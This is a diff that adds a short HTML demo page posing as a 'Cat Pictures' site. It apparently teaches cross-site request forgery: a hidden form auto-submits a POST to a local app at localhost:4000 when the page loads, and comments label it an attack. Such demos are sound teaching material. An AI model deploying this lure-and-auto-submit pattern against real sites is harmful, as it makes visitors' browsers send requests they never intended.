@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Cat Pictures</title>
+  </head>
+  <body>
+    <h1>🐱 Welcome to Cat Pictures!</h1>
+    <p>Loading amazing cat photos...</p>
+
+    <!-- This invisible form attacks your app -->
+    <form
+      id="attack"
+      action="http://localhost:4000/say-hello"
+      method="POST"
+      style="display: none"
+    ></form>
+
+    <script>
+      // Attack happens automatically when page loads
+      setTimeout(() => {
+        document.getElementById("attack").submit();
+        document.body.innerHTML +=
+          '<p style="color:red;">🚨 Attack sent! Check your app!</p>';
+      }, 2000);
+    </script>
+  </body>
+</html>
